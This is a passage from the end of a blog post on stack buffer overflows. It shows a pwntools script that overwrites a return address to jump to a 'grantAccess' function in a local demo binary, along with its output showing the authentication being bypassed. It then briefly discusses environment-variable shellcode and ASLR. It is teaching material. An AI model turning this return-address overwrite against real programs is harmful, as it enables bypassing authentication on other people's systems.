</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;PID: </span><span style=color:#e6db74>{</span>p<span style=color:#f92672>.</span>pid<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Text base: </span><span style=color:#e6db74>{</span>hex(text_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;grantAccess: </span><span style=color:#e6db74>{</span>hex(grant_access)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Build payload</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>+</span> p64(grant_access)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Just send it directly (the program is waiting for input)</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Receive everything</span>
</span></span><span style=display:flex><span>output <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvall(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>print(output)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>close()
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>venv<span style=color:#f92672>)</span> $ python3 exploit3.py
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;./vuln&#39;</span>: pid <span style=color:#ae81ff>4208</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> PID: <span style=color:#ae81ff>4208</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Text base: 0x5dc755119000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> grantAccess: 0x5dc7551191a9
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Receiving all data: Done <span style=color:#f92672>(</span>53B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stopped process <span style=color:#e6db74>&#39;./vuln&#39;</span> <span style=color:#f92672>(</span>pid 4208<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Enter password: Authentication Failed
</span></span><span style=display:flex><span>Access Granted
</span></span></code></pre></div><p>For Overflowing small buffers, some of hacks involve placing the shellcdoe into an environment variable, which will be placed at the top of the stack (as <code>envp</code>, <code>argc</code>, <code>argv</code> are parameters to main function), the buffer then tries to overwrite the return address pointing to the environment variable&rsquo;s location on stack. But these are unrealistic in today&rsquo;s date considering ASLR in 64-bit systems is super solid.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://sankethbk.github.io/blog/tags/vulnerabilities/>Vulnerabilities</a></li><li><a href=https://sankethbk.github.io/blog/tags/buffer-overflow/>Buffer Overflow</a></li><li><a href=https://sankethbk.github.io/blog/tags/reverse-engineering/>Reverse Engineering</a></li></ul></footer></article><section id=references><h2>References</h2><ul><li><a href=https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf target=_blank rel="noopener noreferrer">Smashing the Stack For Fun and Profit</a></li><li><a href=https://shell-storm.org/shellcode/index.html target=_blank rel="noopener noreferrer">ShellCodes</a></li></ul></section></main><footer class=footer><span>&copy; 2026 <a href=https://sankethbk.github.io/blog/>Sanketh's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>